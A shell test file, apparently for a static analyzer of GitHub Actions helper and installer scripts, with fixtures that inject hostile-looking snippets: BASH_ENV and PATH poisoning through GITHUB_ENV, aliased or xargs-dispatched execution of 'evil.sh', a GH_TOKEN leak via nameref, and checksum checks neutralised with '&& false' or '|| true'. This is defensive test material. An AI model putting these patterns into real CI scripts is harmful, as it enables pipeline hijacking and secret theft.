t link-src-workspace 1 "helper-symlink-alias" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ln -s \"\${GITHUB_WORKSPACE}/x\" /tmp/l"
t link-src-system-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ln -s /usr/bin/tool /tmp/t"
t link-hardlink-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ln /tmp/a /tmp/b"
t link-cp-symlink 1 "helper-symlink-alias" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cp -s \"\${SCRIPT_DIR}/x\" /tmp/l"
t link-targetdir 1 "helper-symlink-alias" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ln -s -t /tmp/links \"\${SCRIPT_DIR}/a\" \"\${SCRIPT_DIR}/b\""

# --- perl comment handling (Codex P1: q(#) truncation) ---
t perl-q-comment 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}my \$marker = q(#); system(\"bash\", \"\$ENV{GITHUB_WORKSPACE}/evil.sh\");"
t perl-comment-code 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}# system(\"id\");"
t perl-regex-hash-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}my \$x = (\$y =~ s/#//r);"

# --- xargs dispatch (Codex P1: xargs bash evil.sh) ---
t xargs-bash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf x | xargs bash evil.sh"
t xargs-git-clone 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf x | xargs git clone evil"
t xargs-argfile 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf x | xargs -a \"\${GITHUB_WORKSPACE}/evil\" echo"
t xargs-slotvar 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf x | xargs --process-slot-var=PATH echo"

# --- compare fail-closed shape (Codex P1: && false neutralizer) ---
t cmp-and-false 1 "muse-installer-no-compare" happy.sarif "$I${FS}if [[ \"\${got_sha}\"${FS}r${FS}[[ \"\${got_sha}\" != \"\${want_sha}\" ]]${FS}[[ \"\${got_sha}\" != \"\${want_sha}\" && false ]]"
t cmp-single-quote 1 "muse-installer-no-compare" happy.sarif "$I${FS}if [[ \"\${got_sha}\"${FS}r${FS}\"\${got_sha}\"${FS}'\${got_sha}'"
t cmp-eq-inverted 1 "muse-installer-no-compare" happy.sarif "$I${FS}if [[ \"\${got_sha}\"${FS}r${FS}!=${FS}=="
t cmp-bare-exit 1 "muse-installer-no-compare" happy.sarif "$I${FS}3:exit 1${FS}r${FS}exit 1${FS}exit"
t cmp-no-exit 1 "muse-installer-no-compare" happy.sarif "$I${FS}3:exit 1${FS}d"
t cmp-single-bracket-fp 0 "" happy.sarif "$I${FS}if [[ \"\${got_sha}\"${FS}r${FS}[[${FS}[${RS}$I${FS}if [ \"\${got_sha}\"${FS}r${FS}]]${FS}]"
t cmp-sha256c-fp 0 "" happy.sarif "$I${FS}if [[ \"\${got_sha}\"${FS}r${FS}if [[ \"\${got_sha}\" != \"\${want_sha}\" ]]; then${FS}if false; then${RS}$I${FS}got_sha=${FS}a${FS}sha256sum -c \"\${SCRIPT_DIR}/checksums.txt\""
t cmp-or-true 1 "muse-installer-no-compare" happy.sarif "$I${FS}if [[ \"\${got_sha}\"${FS}r${FS}if [[ \"\${got_sha}\" != \"\${want_sha}\" ]]; then${FS}if false; then${RS}$I${FS}got_sha=${FS}a${FS}sha256sum -c x || true"

# --- runner command files (Codex P1: GITHUB_ENV/GITHUB_PATH writes) ---
t cmdf-env-poison 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"BASH_ENV=\${GITHUB_WORKSPACE}/evil.sh\" >> \"\${GITHUB_ENV}\""
t cmdf-env-path 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"PATH=/evil\" >> \"\$GITHUB_ENV\""
t cmdf-env-benign-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"MY_VAR=hello\" >> \"\$GITHUB_ENV\""
t cmdf-env-cat 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat staged.txt >> \"\$GITHUB_ENV\""
t cmdf-env-cmdsub 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\$(id)\" >> \"\$GITHUB_ENV\""
t cmdf-env-tee 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tee \"\$GITHUB_ENV\" < data.txt"
t cmdf-env-cp 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cp staged.txt \"\$GITHUB_ENV\""
t cmdf-env-hd 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat <<EOF >> \"\$GITHUB_ENV\"${RS}$H${FS}cat <<EOF >>${FS}a${FS}BASH_ENV=/evil${RS}$H${FS}BASH_ENV=/evil${FS}a${FS}EOF"
t cmdf-path-rel 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo rel/bin >> \"\$GITHUB_PATH\""
t cmdf-path-abs-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo /opt/bin >> \"\$GITHUB_PATH\""
t cmdf-path-var-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\$HOME/bin\" >> \"\$GITHUB_PATH\""
t cmdf-path-empty 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo >> \"\$GITHUB_PATH\""

# --- hidden dispatch (Codex P1: alias/shopt expand_aliases) ---
t alias-def 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}alias leak='bash /tmp/evil'"
t alias-query-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}alias leak"
t shopt-expand 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}shopt -s expand_aliases"
t shopt-query-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}shopt expand_aliases"
t shopt-other-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}shopt -s nullglob"
t alias-p1-mutation 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}shopt -s expand_aliases${RS}$H${FS}shopt -s expand_aliases${FS}a${FS}alias leak='bash \"\${GITHUB_WORKSPACE}/evil.sh\"'${RS}$H${FS}alias leak='bash${FS}a${FS}leak"

# --- nameref indirection (Codex P1: declare -n blinds secret/tmp rules) ---
t nameref-secret 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare -n secret_ref=GH_TOKEN; printf '%s' \"\$secret_ref\" >> \"\${prompt_file}\""
t nameref-clean-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare -n ref=MY_VAR${RS}$H${FS}declare -n ref=MY_VAR${FS}a${FS}echo \"\$ref\""
t toctou-alias-nameref 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}declare -n replacement=tmp_bin; cat \"\${GITHUB_WORKSPACE}/evil\" > \"\${replacement}\""
t toctou-alias-nameref-inert-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}a${FS}declare -n replacement=tmp_bin"
